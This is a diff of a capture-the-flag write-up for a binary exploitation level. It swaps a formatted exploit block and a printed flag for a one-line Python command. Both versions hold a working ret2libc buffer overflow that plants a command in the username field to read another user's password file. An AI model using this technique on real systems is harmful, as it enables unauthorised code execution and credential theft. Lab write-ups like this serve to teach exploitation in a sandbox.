@@ -55,19 +55,4 @@ Write `"dat_wil\x00cat /home/users/level02/.pass"` as the username, then call
 `system(a_user_name + 8)` — no interactive shell needed, no stdin buffering issue.
 
 ## One-liner
-
-```bash
-python -c "
-import struct, os
-system   = 0xf7e6aed0
-exit_    = 0xf7e5eb70
-cmd_addr = 0x804a040 + 8   # points to 'cat /home/users/level02/.pass' in username buf
-username = 'dat_wil\x00cat /home/users/level02/.pass\n'
-password = 'A'*80 + struct.pack('<I',system) + struct.pack('<I',exit_) + struct.pack('<I',cmd_addr) + '\n'
-os.write(1, username + password)
-" | ./level01
-```
-
-## Flag
-
-`PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`
+python -c "import struct,os; system=0xf7e6aed0; exit_=0xf7e5eb70; cmd_addr=0x804a040+8; os.write(1,'dat_wil\x00cat /home/users/level02/.pass\n'+'A'*80+struct.pack('<I',system)+struct.pack('<I',exit_)+struct.pack('<I',cmd_addr)+'\n')" | ./level01 
